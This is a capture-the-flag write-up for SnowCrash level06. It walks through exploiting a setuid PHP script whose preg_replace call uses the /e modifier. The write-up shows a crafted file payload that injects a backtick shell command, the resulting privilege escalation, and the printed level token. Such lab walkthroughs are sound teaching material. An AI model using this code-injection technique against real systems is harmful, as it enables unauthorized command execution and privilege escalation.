# level06

- We login as user level06.
```
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php

level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```


- A binary as well as a PHP script are present, the binary appears to execute the PHP script. Here is the content of the script:
```php
#!/usr/bin/php
<?php
function y($m) {
        $m = preg_replace("/\./", " x ", $m);
        $m = preg_replace("/@/", " y", $m);
        return $m;
}

function x($y, $z) {
        $a = file_get_contents($y);
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
        $a = preg_replace("/\[/", "(", $a);
        $a = preg_replace("/\]/", ")", $a);
        return $a;
}

$r = x($argv[1], $argv[2]); print $r;
?>
```


- The script makes calls to `preg_replace()` to format the content of the file given to it as first parameter before displaying it.
The line of interest to us is the following:
>`$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);`


- This line states that if the content of the file starts with `[x` and ends with `]`, everything located between these boundaries can be executed as PHP code (due to `/e`). The output of this execution will then be passed as a parameter to the `y()` function, so:
```
level06@SnowCrash:~$ echo "[x \${\`getflag\`}]" > /tmp/test
level06@SnowCrash:~$ cat /tmp/test
[x ${`getflag`}]

level06@SnowCrash:~$ ./level06 /tmp/test
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

level06@SnowCrash:~$ su level07
Password:wiok45aaoguiboiki2tuin6ub
level07@SnowCrash:~$
```